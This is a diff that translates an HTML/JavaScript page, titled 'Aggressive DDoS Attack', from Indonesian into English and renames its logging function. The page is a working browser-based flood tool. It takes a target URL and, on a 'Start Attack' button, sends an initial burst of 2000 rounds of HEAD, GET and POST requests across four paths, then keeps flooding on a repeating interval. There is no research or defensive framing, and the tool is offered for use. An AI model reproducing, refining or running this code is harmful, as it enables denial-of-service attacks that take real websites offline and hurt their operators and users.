@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Serangan DDoS Agresif</title>
+    <title>Aggressive DDoS Attack</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -52,9 +52,9 @@
     </style>
 </head>
 <body>
-    <h1>Serangan DDoS Agresif</h1>
-    <p>URL Target: <input type="text" id="targetURL" placeholder="https://example.com"></p>
-    <button id="attackButton" onclick="toggleAttack()">Mulai Serangan</button>
+    <h1>Aggressive DDoS Attack</h1>
+    <p>Target URL: <input type="text" id="targetURL" placeholder="https://example.com"></p>
+    <button id="attackButton" onclick="toggleAttack()">Start Attack</button>
     <div id="status"></div>
     <div id="console"></div>
 
@@ -66,18 +66,18 @@
             const attackButton = document.getElementById('attackButton');
             const targetURL = document.getElementById('targetURL').value;
             if (!targetURL) {
-                document.getElementById('status').innerText = 'Silakan masukkan URL target yang valid.';
+                document.getElementById('status').innerText = 'Please enter a valid target URL.';
                 return;
             }
 
             if (!isAttacking) {
-                document.getElementById('status').innerText = 'Serangan sedang berlangsung...';
-                attackButton.innerText = 'Hentikan Serangan';
+                document.getElementById('status').innerText = 'Attack in progress...';
+                attackButton.innerText = 'Stop Attack';
                 isAttacking = true;
                 startAttack(targetURL);
             } else {
-                document.getElementById('status').innerText = 'Serangan dihentikan.';
-                attackButton.innerText = 'Mulai Serangan';
+                document.getElementById('status').innerText = 'Attack stopped.';
+                attackButton.innerText = 'Start Attack';
                 isAttacking = false;
                 stopAttack();
             }
@@ -89,13 +89,13 @@
                 xhr.open(method, targetURL + path, true);
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4) {
-                        logAttack(`${method} ${xhr.status}: ${xhr.responseURL}`);
+                        consoleOutput(`${method} ${xhr.status}: ${xhr.responseURL}`);
                     }
                 };
                 xhr.send();
             }
 
-            // Ledakan awal 2000 permintaan untuk setiap metode dan path
+            // Initial burst of 2000 requests for each method and path
             const methods = ['HEAD', 'GET', 'POST'];
             const paths = ['/', '/index.html', '/api', '/randompath'];
             for (let i = 0; i < 2000; i++) {
@@ -104,7 +104,7 @@
                 });
             }
 
-            // Looping agresif untuk setiap metode dan path
+            // Aggressive looping for each method and path
             attackInterval = setInterval(() => {
                 methods.forEach(method => {
                     paths.forEach(path => sendRequest(method, path));
@@ -118,12 +118,12 @@
             }
         }
 
-        function logAttack(message) {
+        function consoleOutput(message) {
             const consoleDiv = document.getElementById('console');
             const newMessage = document.createElement('div');
             newMessage.textContent = message;
             consoleDiv.appendChild(newMessage);
-            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll ke bawah
+            consoleDiv.scrollTop = consoleDiv.scrollHeight; // Auto-scroll to the bottom
         }
     </script>
 </body>
